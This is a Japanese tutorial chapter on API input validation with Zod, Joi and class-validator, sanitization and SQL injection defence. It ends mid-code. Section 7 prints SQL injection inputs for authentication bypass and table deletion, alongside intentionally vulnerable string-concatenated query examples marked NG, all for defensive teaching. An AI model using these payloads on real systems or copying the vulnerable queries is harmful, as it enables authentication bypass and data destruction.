# 入力バリデーション

> 入力バリデーションはAPIセキュリティの最前線である。Zod・Joi・class-validatorによる型安全なバリデーション、JSON Schema、サニタイゼーション、SQLインジェクション対策、一般的な攻撃パターンへの防御まで、信頼境界での入力検証の全技法を体系的に解説する。

## この章で学ぶこと

- [ ] バリデーションの設計原則と信頼境界モデルを理解する
- [ ] Zod・Joi・class-validator の特性と使い分けを把握する
- [ ] サニタイゼーションとエスケープの正しい適用方法を学ぶ
- [ ] SQLインジェクション・XSS・Mass Assignmentなど主要攻撃への防御を実装できる
- [ ] バリデーションエラーレスポンスの設計原則を習得する
- [ ] 本番環境で頻出するエッジケースへの対処を理解する

---

## 1. バリデーションの原則と信頼境界モデル

### 1.1 信頼境界とは何か

信頼境界（Trust Boundary）とは、システム内部と外部を隔てる論理的な境界線である。この境界を超えて流入するすべてのデータは、悪意を持つ可能性があるものとして扱わなければならない。

```
+=====================================================================+
|                    信頼境界モデル（Trust Boundary Model）              |
+=====================================================================+
|                                                                     |
|  外部（信頼できない領域）              信頼境界          内部（信頼できる領域）  |
|  +--------------------------+    |  +--------------------------+    |
|  |  ブラウザ / モバイルアプリ   |    |  |                          |    |
|  |  ・リクエストボディ         | ──>|  |  バリデーション層           |    |
|  |  ・クエリパラメータ         |    |  |  ┌──────────────┐       |    |
|  |  ・パスパラメータ          |    |  |  │ 型チェック      │       |    |
|  |  ・HTTPヘッダー           |    |  |  │ 形式チェック     │       |    |
|  |  ・Cookie               |    |  |  │ 範囲チェック     │       |    |
|  |  ・ファイルアップロード     |    |  |  │ パターン検証     │       |    |
|  +--------------------------+    |  |  │ ビジネスルール    │       |    |
|                                  |  |  │ サニタイゼーション │       |    |
|  +--------------------------+    |  |  └──────────────┘       |    |
|  |  外部API / Webhook       | ──>|  |       │                    |    |
|  |  ・レスポンスボディ        |    |  |       v                    |    |
|  |  ・ヘッダー値             |    |  |  ビジネスロジック層          |    |
|  +--------------------------+    |  |       │                    |    |
|                                  |  |       v                    |    |
|  +--------------------------+    |  |  データアクセス層            |    |
|  |  DBからの読み取りデータ     | ──>|  |  （パラメタライズドクエリ）    |    |
|  |  ※過去に不正データが        |    |  +--------------------------+    |
|  |    保存されている可能性     |    |                                  |
|  +--------------------------+    |                                  |
|                                                                     |
+=====================================================================+
```

### 1.2 信頼できない入力の全一覧

APIが受け取るあらゆるデータソースについて、信頼レベルを明確に分類する。

| データソース | 信頼レベル | バリデーション要否 | 補足 |
|-------------|-----------|-----------------|------|
| リクエストボディ（JSON/XML/Form） | 信頼できない | 必須 | 最も攻撃対象になる |
| クエリパラメータ | 信頼できない | 必須 | URL に含まれるため改ざん容易 |
| パスパラメータ | 信頼できない | 必須 | UUID/ID 形式の検証が必要 |
| HTTP ヘッダー | 信頼できない | 必須 | Authorization, Content-Type など |
| Cookie | 信頼できない | 必須 | JWT トークンの署名検証が必要 |
| ファイルアップロード | 信頼できない | 必須 | MIME タイプ偽装に注意 |
| 外部 API レスポンス | 条件付き信頼 | 推奨 | スキーマ変更に対する防御 |
| DB からの既存データ | 条件付き信頼 | 推奨 | 過去の不正データ混入リスク |
| 環境変数 | 内部信頼 | 起動時検証 | 起動時にスキーマ検証すべき |

### 1.3 バリデーションの6つの段階

バリデーションは単なる「型チェック」ではなく、6つの段階を持つ多層防御である。

```
+===========================================================+
|              バリデーションの6段階ピラミッド                    |
+===========================================================+
|                                                           |
|                    ┌─────────┐                            |
|                    │ ⑥ 関連  │  開始日 < 終了日            |
|                    │  チェック │  合計金額 = 明細合計         |
|                   ┌┴─────────┴┐                           |
|                   │ ⑤ ビジネス │  在庫数 > 0               |
|                   │  ルール    │  年齢 >= 18               |
|                  ┌┴───────────┴┐                          |
|                  │ ④ パターン   │  正規表現による検証         |
|                  │  チェック    │  電話番号, 郵便番号         |
|                 ┌┴─────────────┴┐                         |
|                 │ ③ 範囲チェック  │  min, max, minLength    |
|                 │               │  maxLength, enum         |
|                ┌┴───────────────┴┐                        |
|                │ ② 形式チェック    │  email, URL, UUID       |
|                │                 │  ISO 8601 日時           |
|               ┌┴─────────────────┴┐                       |
|               │ ① 型チェック        │  string, number        |
|               │                   │  boolean, array, object │
|               └───────────────────┘                       |
|                                                           |
|  ※ 下層ほど基本的で、上層ほどドメイン固有                       |
|  ※ 各段階を順に通過させることで安全性を積み上げる                 |
+===========================================================+
```

### 1.4 バリデーション設計の4原則

**原則1: Fail Fast（早期失敗）**

バリデーションエラーはできるだけ早い段階で検出し、処理を中断する。ビジネスロジック層やデータアクセス層まで不正データを到達させてはならない。

**原則2: Collect All Errors（全エラー収集）**

ユーザー体験の観点から、エラーは1つずつ返すのではなく、検出されたすべてのエラーをまとめて返す。これにより、クライアント側で一度にすべての修正が可能になる。

**原則3: Specific Error Messages（具体的エラーメッセージ）**

「入力が不正です」のような曖昧なメッセージではなく、「メールアドレスの形式が正しくありません」のように具体的な内容を伝える。ただし、内部実装の詳細は漏洩させない。

**原則4: Whitelist over Blacklist（ホワイトリスト優先）**

「禁止する文字を列挙する」のではなく、「許可する文字を明示的に定義する」アプローチを取る。ブラックリストは攻撃パターンの進化に追従できないためである。

---

## 2. Zod によるバリデーション

### 2.1 Zod の基本概念

Zod は TypeScript-first のスキーマバリデーションライブラリである。スキーマ定義から TypeScript の型を自動推論できることが最大の特長であり、バリデーションスキーマと型定義の二重管理を解消できる。

```typescript
// ============================================================
// コード例1: Zod の基本スキーマ定義とバリデーション
// ============================================================
import { z } from 'zod';

// --- ユーザー作成スキーマ ---
const CreateUserSchema = z.object({
  // 文字列フィールド: trim() で前後の空白を除去
  name: z.string()
    .min(1, 'Name is required')
    .max(100, 'Name must be 100 characters or less')
    .trim(),

  // メールアドレス: 組み込みの email バリデータ + 小文字変換
  email: z.string()
    .email('Invalid email format')
    .toLowerCase(),

  // 数値フィールド: optional で省略可能に
  age: z.number()
    .int('Age must be an integer')
    .min(0, 'Age must be non-negative')
    .max(150, 'Age must be 150 or less')
    .optional(),

  // 列挙型: 許可値を明示的に定義
  role: z.enum(['user', 'admin', 'editor'])
    .default('user'),

  // 配列: 要素の型と配列サイズを同時に制約
  tags: z.array(z.string().max(50))
    .max(10, 'Maximum 10 tags')
    .default([]),

  // ネストしたオブジェクト
  address: z.object({
    street: z.string().min(1),
    city: z.string().min(1),
    postalCode: z.string().regex(/^\d{3}-?\d{4}$/, 'Invalid postal code'),
  }).optional(),
});

// 型の自動推論: スキーマから TypeScript 型を生成
type CreateUserInput = z.infer<typeof CreateUserSchema>;
// 推論結果:
// {
//   name: string;
//   email: string;
//   age?: number;
//   role: 'user' | 'admin' | 'editor';
//   tags: string[];
//   address?: { street: string; city: string; postalCode: string };
// }

// --- バリデーション実行（安全な方法） ---
function validateInput<T>(schema: z.ZodSchema<T>, data: unknown) {
  const result = schema.safeParse(data);

  if (!result.success) {
    // Zod のエラー情報を API レスポンス形式に変換
    const errors = result.error.issues.map(issue => ({
      field: issue.path.join('.'),
      message: issue.message,
      code: issue.code,
    }));
    return { success: false as const, errors };
  }

  return { success: true as const, data: result.data };
}

// --- 使用例 ---
const input = {
  name: '  Tanaka Taro  ',
  email: 'Tanaka@Example.COM',
  age: 25,
  tags: ['developer', 'typescript'],
};

const result = validateInput(CreateUserSchema, input);
if (result.success) {
  console.log(result.data);
  // { name: 'Tanaka Taro', email: 'tanaka@example.com', age: 25,
  //   role: 'user', tags: ['developer', 'typescript'] }
  // ※ trim() と toLowerCase() が自動適用されている
}
```

### 2.2 Express ミドルウェアとしての統合

```typescript
// ============================================================
// コード例2: Express バリデーションミドルウェア（汎用設計）
// ============================================================
import { z, ZodSchema } from 'zod';
import { Request, Response, NextFunction } from 'express';

// バリデーション対象を指定可能な汎用ミドルウェア
interface ValidateOptions {
  body?: ZodSchema;
  query?: ZodSchema;
  params?: ZodSchema;
}

function validate(schemas: ValidateOptions) {
  return (req: Request, res: Response, next: NextFunction) => {
    const allErrors: Array<{
      location: string;
      field: string;
      code: string;
      message: string;
    }> = [];

    // body のバリデーション
    if (schemas.body) {
      const result = schemas.body.safeParse(req.body);
      if (!result.success) {
        result.error.issues.forEach(issue => {
          allErrors.push({
            location: 'body',
            field: issue.path.join('.'),
            code: issue.code,
            message: issue.message,
          });
        });
      } else {
        req.body = result.data; // バリデーション済みデータで上書き
      }
    }

    // query のバリデーション
    if (schemas.query) {
      const result = schemas.query.safeParse(req.query);
      if (!result.success) {
        result.error.issues.forEach(issue => {
          allErrors.push({
            location: 'query',
            field: issue.path.join('.'),
            code: issue.code,
            message: issue.message,
          });
        });
      } else {
        (req as any).validatedQuery = result.data;
      }
    }

    // params のバリデーション
    if (schemas.params) {
      const result = schemas.params.safeParse(req.params);
      if (!result.success) {
        result.error.issues.forEach(issue => {
          allErrors.push({
            location: 'params',
            field: issue.path.join('.'),
            code: issue.code,
            message: issue.message,
          });
        });
      } else {
        (req as any).validatedParams = result.data;
      }
    }

    // エラーがあれば RFC 7807 形式で返す
    if (allErrors.length > 0) {
      return res.status(422).json({
        type: 'https://api.example.com/errors/validation',
        title: 'Validation Error',
        status: 422,
        detail: `The request contains ${allErrors.length} validation error(s).`,
        errors: allErrors,
      });
    }

    next();
  };
}

// --- ルーティングでの使用 ---

// ユーザー一覧取得: クエリパラメータのバリデーション
const PaginationSchema = z.object({
  page: z.coerce.number().int().min(1).default(1),
  perPage: z.coerce.number().int().min(1).max(100).default(20),
  sort: z.enum(['createdAt', 'name', 'email']).default('createdAt'),
  order: z.enum(['asc', 'desc']).default('desc'),
});

app.get('/api/v1/users',
  validate({ query: PaginationSchema }),
  async (req, res) => {
    const { page, perPage, sort, order } = (req as any).validatedQuery;
    const users = await userService.list({ page, perPage, sort, order });
    res.json({ data: users });
  }
);

// ユーザー作成: ボディのバリデーション
app.post('/api/v1/users',
  validate({ body: CreateUserSchema }),
  async (req, res) => {
    const user = await userService.create(req.body);
    res.status(201).json({ data: user });
  }
);

// ユーザー取得: パスパラメータのバリデーション
const UserIdParamsSchema = z.object({
  userId: z.string().uuid('Invalid user ID format'),
});

app.get('/api/v1/users/:userId',
  validate({ params: UserIdParamsSchema }),
  async (req, res) => {
    const { userId } = (req as any).validatedParams;
    const user = await userService.findById(userId);
    res.json({ data: user });
  }
);
```

### 2.3 高度なバリデーションパターン

```typescript
// ============================================================
// コード例3: Zod の高度なバリデーション機能
// ============================================================

// --- カスタムバリデーション: パスワード強度 ---
const PasswordSchema = z.string()
  .min(8, 'Password must be at least 8 characters')
  .max(128, 'Password must be 128 characters or less')
  .refine(
    (val) => /[A-Z]/.test(val),
    'Password must contain at least one uppercase letter'
  )
  .refine(
    (val) => /[a-z]/.test(val),
    'Password must contain at least one lowercase letter'
  )
  .refine(
    (val) => /[0-9]/.test(val),
    'Password must contain at least one digit'
  )
  .refine(
    (val) => /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(val),
    'Password must contain at least one special character'
  );

// --- 相互依存バリデーション: 日付範囲 ---
const DateRangeSchema = z.object({
  startDate: z.string().datetime(),
  endDate: z.string().datetime(),
}).refine(
  (data) => new Date(data.startDate) < new Date(data.endDate),
  { message: 'End date must be after start date', path: ['endDate'] }
).refine(
  (data) => {
    const diff = new Date(data.endDate).getTime() - new Date(data.startDate).getTime();
    const maxDays = 365;
    return diff <= maxDays * 24 * 60 * 60 * 1000;
  },
  { message: 'Date range must not exceed 365 days', path: ['endDate'] }
);

// --- discriminatedUnion: 条件分岐バリデーション ---
const NotificationSchema = z.discriminatedUnion('type', [
  z.object({
    type: z.literal('email'),
    email: z.string().email(),
    subject: z.string().min(1).max(200),
    body: z.string().min(1).max(10000),
  }),
  z.object({
    type: z.literal('sms'),
    phone: z.string().regex(/^\+?\d{10,15}$/),
    message: z.string().min(1).max(160),
  }),
  z.object({
    type: z.literal('push'),
    deviceToken: z.string().min(1),
    title: z.string().min(1).max(100),
    body: z.string().min(1).max(1000),
  }),
]);

// --- transform: バリデーション後のデータ変換 ---
const SearchQuerySchema = z.object({
  q: z.string()
    .min(1)
    .max(200)
    .transform(val => val.trim().toLowerCase()),

  categories: z.string()
    .transform(val => val.split(',').map(s => s.trim()))
    .pipe(z.array(z.string().min(1)).min(1).max(10))
    .optional(),

  minPrice: z.coerce.number().min(0).optional(),
  maxPrice: z.coerce.number().min(0).optional(),
}).refine(
  (data) => {
    if (data.minPrice !== undefined && data.maxPrice !== undefined) {
      return data.minPrice <= data.maxPrice;
    }
    return true;
  },
  { message: 'minPrice must be less than or equal to maxPrice', path: ['minPrice'] }
);

// --- preprocess: 入力の前処理 ---
const FlexibleDateSchema = z.preprocess(
  (val) => {
    if (typeof val === 'string') return new Date(val);
    if (typeof val === 'number') return new Date(val);
    return val;
  },
  z.date().min(new Date('2000-01-01')).max(new Date('2100-12-31'))
);

// --- recursive: 再帰的スキーマ ---
interface Category {
  name: string;
  children: Category[];
}

const CategorySchema: z.ZodType<Category> = z.lazy(() =>
  z.object({
    name: z.string().min(1).max(100),
    children: z.array(CategorySchema).max(50).default([]),
  })
);

// --- strict モード: 未定義フィールドの拒否 ---
const StrictUserSchema = z.object({
  name: z.string(),
  email: z.string().email(),
}).strict(); // role, isAdmin 等の余計なフィールドを拒否

// StrictUserSchema.parse({ name: 'Taro', email: 'taro@example.com', role: 'admin' })
// -> ZodError: Unrecognized key(s) in object: 'role'
```

---

## 3. Joi によるバリデーション

### 3.1 Joi の特長と基本使用法

Joi は Node.js エコシステムで最も歴史のあるバリデーションライブラリの1つであり、hapi フレームワークから独立して発展した。豊富な組み込みバリデータと分かりやすい API が特長である。

```typescript
// ============================================================
// コード例4: Joi によるスキーマ定義とバリデーション
// ============================================================
import Joi from 'joi';

// --- ユーザー作成スキーマ ---
const createUserSchema = Joi.object({
  name: Joi.string()
    .min(1)
    .max(100)
    .trim()
    .required()
    .messages({
      'string.empty': '名前は必須です',
      'string.max': '名前は100文字以内で入力してください',
    }),

  email: Joi.string()
    .email({ tlds: { allow: false } })
    .lowercase()
    .required()
    .messages({
      'string.email': '有効なメールアドレスを入力してください',
    }),

  age: Joi.number()
    .integer()
    .min(0)
    .max(150)
    .optional(),

  role: Joi.string()
    .valid('user', 'admin', 'editor')
    .default('user'),

  tags: Joi.array()
    .items(Joi.string().max(50))
    .max(10)
    .default([]),

  password: Joi.string()
    .min(8)
    .max(128)
    .pattern(/[A-Z]/, 'uppercase')
    .pattern(/[a-z]/, 'lowercase')
    .pattern(/[0-9]/, 'digit')
    .required(),

  passwordConfirm: Joi.string()
    .valid(Joi.ref('password'))
    .required()
    .messages({
      'any.only': 'パスワード確認が一致しません',
    }),

  address: Joi.object({
    street: Joi.string().min(1).required(),
    city: Joi.string().min(1).required(),
    postalCode: Joi.string()
      .pattern(/^\d{3}-?\d{4}$/)
      .required(),
  }).optional(),
}).options({
  abortEarly: false,  // 全エラーを収集（1つ目で中断しない）
  stripUnknown: true,  // 未定義フィールドを除去
});

// --- バリデーション実行 ---
function validateWithJoi<T>(
  schema: Joi.ObjectSchema<T>,
  data: unknown
): { success: true; data: T } | { success: false; errors: any[] } {
  const { error, value } = schema.validate(data, {
    abortEarly: false,
    stripUnknown: true,
  });

  if (error) {
    const errors = error.details.map(detail => ({
      field: detail.path.join('.'),
      message: detail.message,
      type: detail.type,
    }));
    return { success: false, errors };
  }

  return { success: true, data: value as T };
}

// --- 条件分岐バリデーション（when） ---
const paymentSchema = Joi.object({
  method: Joi.string()
    .valid('credit_card', 'bank_transfer', 'convenience')
    .required(),

  // method が credit_card の場合のみ必須
  cardNumber: Joi.string()
    .creditCard()
    .when('method', {
      is: 'credit_card',
      then: Joi.required(),
      otherwise: Joi.forbidden(),
    }),

  cardExpiry: Joi.string()
    .pattern(/^(0[1-9]|1[0-2])\/\d{2}$/)
    .when('method', {
      is: 'credit_card',
      then: Joi.required(),
      otherwise: Joi.forbidden(),
    }),

  // method が bank_transfer の場合のみ必須
  bankCode: Joi.string()
    .pattern(/^\d{4}$/)
    .when('method', {
      is: 'bank_transfer',
      then: Joi.required(),
      otherwise: Joi.forbidden(),
    }),

  accountNumber: Joi.string()
    .pattern(/^\d{7}$/)
    .when('method', {
      is: 'bank_transfer',
      then: Joi.required(),
      otherwise: Joi.forbidden(),
    }),
});

// --- Express ミドルウェア ---
function joiValidate(schema: Joi.ObjectSchema) {
  return (req: Request, res: Response, next: NextFunction) => {
    const { error, value } = schema.validate(req.body, {
      abortEarly: false,
      stripUnknown: true,
    });

    if (error) {
      return res.status(422).json({
        type: 'https://api.example.com/errors/validation',
        title: 'Validation Error',
        status: 422,
        errors: error.details.map(d => ({
          field: d.path.join('.'),
          message: d.message,
          type: d.type,
        })),
      });
    }

    req.body = value;
    next();
  };
}
```

---

## 4. class-validator によるバリデーション

### 4.1 class-validator の特長

class-validator はデコレータベースのバリデーションライブラリであり、NestJS のデフォルトバリデーションソリューションとして広く採用されている。クラスベースの OOP スタイルに適合し、class-transformer と組み合わせることでリクエストの自動変換・検証が可能になる。

```typescript
// ============================================================
// コード例5: class-validator + class-transformer によるバリデーション
// ============================================================
import {
  IsString, IsEmail, IsInt, Min, Max, IsOptional,
  IsEnum, IsArray, ArrayMaxSize, MaxLength, MinLength,
  ValidateNested, Matches, IsUUID, ValidateIf,
  registerDecorator, ValidationOptions, ValidationArguments,
} from 'class-validator';
import { Type, Transform, plainToInstance } from 'class-transformer';

// カスタムバリデータデコレータ
function IsStrongPassword(validationOptions?: ValidationOptions) {
  return function (object: Object, propertyName: string) {
    registerDecorator({
      name: 'isStrongPassword',
      target: object.constructor,
      propertyName: propertyName,
      options: validationOptions,
      validator: {
        validate(value: any) {
          if (typeof value !== 'string') return false;
          return (
            value.length >= 8 &&
            /[A-Z]/.test(value) &&
            /[a-z]/.test(value) &&
            /[0-9]/.test(value)
          );
        },
        defaultMessage(args: ValidationArguments) {
          return 'Password must be at least 8 chars with uppercase, lowercase, and digit';
        },
      },
    });
  };
}

// --- DTO（Data Transfer Object）定義 ---
class AddressDto {
  @IsString()
  @MinLength(1)
  street: string;

  @IsString()
  @MinLength(1)
  city: string;

  @IsString()
  @Matches(/^\d{3}-?\d{4}$/, { message: 'Invalid postal code format' })
  postalCode: string;
}

enum UserRole {
  USER = 'user',
  ADMIN = 'admin',
  EDITOR = 'editor',
}

class CreateUserDto {
  @IsString()
  @MinLength(1, { message: 'Name is required' })
  @MaxLength(100, { message: 'Name must be 100 characters or less' })
  @Transform(({ value }) => typeof value === 'string' ? value.trim() : value)
  name: string;

  @IsEmail({}, { message: 'Invalid email format' })
  @Transform(({ value }) => typeof value === 'string' ? value.toLowerCase() : value)
  email: string;

  @IsOptional()
  @IsInt({ message: 'Age must be an integer' })
  @Min(0, { message: 'Age must be non-negative' })
  @Max(150, { message: 'Age must be 150 or less' })
  age?: number;

  @IsEnum(UserRole)
  role: UserRole = UserRole.USER;

  @IsArray()
  @ArrayMaxSize(10, { message: 'Maximum 10 tags' })
  @IsString({ each: true })
  @MaxLength(50, { each: true })
  tags: string[] = [];

  @IsOptional()
  @ValidateNested()
  @Type(() => AddressDto)
  address?: AddressDto;

  @IsStrongPassword({ message: 'Password is too weak' })
  password: string;
}

// --- NestJS での使用例 ---
// NestJS は ValidationPipe を通じて class-validator を自動実行する
//
// @Controller('users')
// export class UsersController {
//   @Post()
//   async create(@Body() dto: CreateUserDto) {
//     // dto は既にバリデーション済み
//     return this.usersService.create(dto);
//   }
// }
//
// // main.ts
// app.useGlobalPipes(new ValidationPipe({
//   whitelist: true,        // DTO に定義されていないプロパティを除去
//   forbidNonWhitelisted: true,  // 未定義プロパティがあればエラー
//   transform: true,        // plainToInstance を自動実行
//   transformOptions: {
//     enableImplicitConversion: true,
//   },
// }));

// --- 手動でのバリデーション実行 ---
import { validate } from 'class-validator';

async function validateDto<T extends object>(
  DtoClass: new () => T,
  data: unknown
): Promise<{ success: true; data: T } | { success: false; errors: any[] }> {
  const instance = plainToInstance(DtoClass, data);
  const errors = await validate(instance, {
    whitelist: true,
    forbidNonWhitelisted: true,
  });

  if (errors.length > 0) {
    const formattedErrors = errors.flatMap(err =>
      Object.values(err.constraints || {}).map(message => ({
        field: err.property,
        message,
      }))
    );
    return { success: false, errors: formattedErrors };
  }

  return { success: true, data: instance };
}
```

---

## 5. バリデーションライブラリ比較

### 5.1 Zod vs Joi vs class-validator 総合比較表

| 比較項目 | Zod | Joi | class-validator |
|---------|-----|-----|-----------------|
| 設計思想 | TypeScript-first, 関数型 | JavaScript-first, メソッドチェーン | デコレータベース, OOP |
| TypeScript 型推論 | z.infer で自動推論 | 別途型定義が必要 | クラス定義から推論 |
| バンドルサイズ | 約 13KB (gzip) | 約 45KB (gzip) | 約 20KB (gzip) |
| Tree Shaking | 対応 | 非対応 | 部分対応 |
| 非同期バリデーション | refine で対応 | external で対応 | カスタムデコレータで対応 |
| 条件分岐 | discriminatedUnion | when | ValidateIf |
| エラーメッセージ | カスタマイズ可 | messages() で詳細設定 | message オプション |
| 変換（Transform） | transform() | 自動変換あり | class-transformer |
| 再帰的スキーマ | z.lazy() | Joi.link() | ValidateNested |
| フレームワーク連携 | 汎用（どこでも使用可） | hapi と親和性高 | NestJS のデフォルト |
| 学習コスト | 低い | 中程度 | 中程度（デコレータ理解要） |
| npm 週間DL数 | 約 800万 (2025年) | 約 600万 (2025年) | 約 400万 (2025年) |
| 主要採用先 | tRPC, Next.js | hapi, Express | NestJS |

### 5.2 使い分けガイドライン

```
+===============================================================+
|             バリデーションライブラリ選定フローチャート               |
+===============================================================+
|                                                               |
|  Q1: フレームワークは何か?                                      |
|  ├─ NestJS ──────────> class-validator (推奨)                  |
|  ├─ hapi ────────────> Joi (推奨)                              |
|  └─ その他 ──> Q2へ                                            |
|                                                               |
|  Q2: TypeScript を使用しているか?                               |
|  ├─ Yes ──> Q3へ                                               |
|  └─ No ───────────────> Joi (JavaScript でも使いやすい)         |
|                                                               |
|  Q3: 型推論の自動化を重視するか?                                 |
|  ├─ Yes ──────────────> Zod (型とスキーマの一元管理)             |
|  └─ No ───────────────> いずれも可                              |
|                                                               |
|  Q4: バンドルサイズを重視するか?                                 |
|  ├─ Yes ──────────────> Zod (最軽量)                            |
|  └─ No ───────────────> 機能要件で判断                          |
|                                                               |
+===============================================================+
```

---

## 6. サニタイゼーション

### 6.1 サニタイゼーションの原則

サニタイゼーション（無害化）とは、入力データから潜在的に危険な要素を除去または変換する処理である。バリデーション（検証）とは異なり、データを「拒否」するのではなく「安全な形に変換」する点が特徴である。

重要な原則として、サニタイゼーションは「入力時」と「出力時」の両方で行う必要がある。

```
+===============================================================+
|              サニタイゼーションの適用ポイント                      |
+===============================================================+
|                                                               |
|  [入力時サニタイゼーション]                                      |
|  ・前後の空白除去 (trim)                                        |
|  ・大文字/小文字の統一                                           |
|  ・制御文字の除去                                                |
|  ・Unicode の正規化 (NFC/NFKC)                                  |
|  ・NULL バイトの除去                                             |
|                                                               |
|  [出力時サニタイゼーション]                                      |
|  ・HTML エスケープ（ブラウザへの出力時）                           |
|  ・SQL パラメータバインド（DB クエリ時）                           |
|  ・URL エンコード（URL への埋め込み時）                            |
|  ・JSON エスケープ（JSON レスポンス時）                            |
|                                                               |
|  ※ 保存時のデータは可能な限り「生データ」で保持し、                  |
|    出力先のコンテキストに応じてエスケープする                       |
+===============================================================+
```

### 6.2 HTML エスケープの実装

```typescript
// HTML エスケープ（XSS 対策の基本）
function escapeHtml(str: string): string {
  const map: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };
  return str.replace(/[&<>"'/]/g, (c) => map[c]);
}

// DOMPurify を使った高度なサニタイゼーション（サーバーサイド）
import createDOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

function sanitizeHtml(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
  });
}

// Zod の transform でサニタイズを統合
const CommentSchema = z.object({
  content: z.string()
    .min(1, 'Comment is required')
    .max(10000, 'Comment must be 10000 characters or less')
    .transform(escapeHtml),

  htmlContent: z.string()
    .max(50000)
    .transform(sanitizeHtml)
    .optional(),
});
```

### 6.3 制御文字・Unicode の正規化

```typescript
// 制御文字の除去
function removeControlChars(str: string): string {
  // ASCII 制御文字を除去（タブ、改行、復帰は許可）
  return str.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '');
}

// NULL バイトの除去（パストラバーサル対策）
function removeNullBytes(str: string): string {
  return str.replace(/\0/g, '');
}

// Unicode 正規化（見た目が同じで異なるバイト列の統一）
function normalizeUnicode(str: string): string {
  return str.normalize('NFC');
}

// 包括的なサニタイゼーション関数
function sanitizeInput(str: string): string {
  return normalizeUnicode(
    removeNullBytes(
      removeControlChars(str.trim())
    )
  );
}

// Zod での包括的サニタイゼーション
const SafeStringSchema = z.string()
  .max(1000)
  .transform(sanitizeInput);
```

### 6.4 ファイルアップロードのバリデーション

```typescript
// ファイルアップロードのバリデーション
const FileUploadSchema = z.object({
  filename: z.string()
    .max(255)
    .regex(/^[a-zA-Z0-9._-]+$/, 'Invalid filename characters')
    .refine(
      (name) => !name.includes('..'),
      'Path traversal detected'
    ),
  mimeType: z.enum([
    'image/jpeg', 'image/png', 'image/webp', 'image/gif',
    'application/pdf',
    'text/plain', 'text/csv',
  ]),
  size: z.number()
    .max(10 * 1024 * 1024, 'File must be under 10MB'),
});

// マジックバイトによる MIME タイプ検証
// ※ Content-Type ヘッダーは偽装可能なため、
//   ファイルの先頭バイト列で実際の形式を確認する
const MAGIC_BYTES: Record<string, Buffer> = {
  'image/jpeg': Buffer.from([0xFF, 0xD8, 0xFF]),
  'image/png': Buffer.from([0x89, 0x50, 0x4E, 0x47]),
  'image/gif': Buffer.from([0x47, 0x49, 0x46]),
  'application/pdf': Buffer.from([0x25, 0x50, 0x44, 0x46]),
};

function verifyMimeType(buffer: Buffer, claimedMime: string): boolean {
  const expected = MAGIC_BYTES[claimedMime];
  if (!expected) return false;
  return buffer.subarray(0, expected.length).equals(expected);
}
```

---

## 7. SQL インジェクション対策

### 7.1 SQL インジェクションの仕組み

SQL インジェクションは、ユーザー入力が SQL クエリの一部として解釈されることで発生する脆弱性である。OWASP Top 10 で常に上位に位置し、データ漏洩・改ざん・削除など壊滅的な被害をもたらす。

```
+================================================================+
|              SQL インジェクション攻撃の流れ                       |
+================================================================+
|                                                                |
|  [正常なリクエスト]                                              |
|  POST /api/login                                               |
|  { "email": "taro@example.com", "password": "secret123" }      |
|                                                                |
|  生成されるSQL（文字列結合の場合 = 危険）:                        |
|  SELECT * FROM users                                           |
|    WHERE email = 'taro@example.com'                            |
|      AND password = 'secret123'                                |
|                                                                |
|  ─────────────────────────────────────                         |
|                                                                |
|  [攻撃リクエスト]                                               |
|  POST /api/login                                               |
|  { "email": "' OR '1'='1' --", "password": "anything" }       |
|                                                                |
|  生成されるSQL:                                                 |
|  SELECT * FROM users                                           |
|    WHERE email = '' OR '1'='1' --'                             |
|      AND password = 'anything'                                 |
|                                                                |
|  解釈: WHERE (email='') OR ('1'='1')                           |
|  結果: 全レコードが返される（認証バイパス）                        |
|                                                                |
|  ─────────────────────────────────────                         |
|                                                                |
|  [破壊的攻撃]                                                   |
|  { "email": "'; DROP TABLE users; --" }                        |
|                                                                |
|  生成されるSQL:                                                 |
|  SELECT * FROM users                                           |
|    WHERE email = ''; DROP TABLE users; --'                     |
|                                                                |
|  結果: users テーブルが削除される                                |
|                                                                |
+================================================================+
```

### 7.2 パラメタライズドクエリ（プリペアドステートメント）

SQL インジェクション対策の基本中の基本は、パラメタライズドクエリ（プリペアドステートメント）の使用である。これにより、ユーザー入力は常に「データ」として扱われ、SQL 構文として解釈されることがなくなる。

```typescript
// ============================================================
// コード例6: パラメタライズドクエリの各種実装
// ============================================================

// --- pg（PostgreSQL） ---
import { Pool } from 'pg';
const pool = new Pool();

// NG: 文字列結合（絶対にやってはならない）
async function findUserBad(email: string) {
  // !! 脆弱 !!
  const result = await pool.query(
    `SELECT * FROM users WHERE email = '${email}'`
  );
  return result.rows[0];
}

// OK: パラメタライズドクエリ
async function findUserGood(email: string) {
  const result = await pool.query(
    'SELECT * FROM users WHERE email = $1',
    [email]
  );
  return result.rows[0];
}

// OK: 複数パラメータ
async function searchUsers(name: string, role: string, limit: number) {
  const result = await pool.query(
    `SELECT id, name, email, role FROM users
     WHERE name ILIKE $1 AND role = $2
     ORDER BY created_at DESC
     LIMIT $3`,
    [`%${name}%`, role, limit]
  );
  return result.rows;
}

// --- mysql2 ---
import mysql from 'mysql2/promise';

async function findUserMySQL(email: string) {
  const [rows] = await connection.execute(
    'SELECT * FROM users WHERE email = ?',
    [email]
  );
  return rows[0];
}

// --- Prisma ORM ---
// Prisma は内部的にパラメタライズドクエリを使用するため、
// 通常の API 使用では SQL インジェクションは発生しない
async function findUserPrisma(email: string) {
  return prisma.user.findUnique({
    where: { email },  // 自動的にパラメータバインドされる
  });
}

// ただし Prisma.$queryRaw を使う場合は注意が必要
// NG:
const resultBad = await prisma.$queryRawUnsafe(
  `SELECT * FROM users WHERE email = '${email}'`
);

// OK: テンプレートリテラルを使用（Prisma が自動パラメータ化）
const resultGood = await prisma.$queryRaw`
  SELECT * FROM users WHERE email = ${email}
`;

// --- Knex.js ---
// Knex のクエリビルダは自動的にパラメータバインドを行う
async function findUserKnex(email: string) {
  return knex('users').where({ email }).first();
}

// whereRaw を使う場合はバインディングを明示
async function searchUserKnex(name: string) {
  return knex('users')
    .whereRaw('name ILIKE ?', [`%${name}%`])
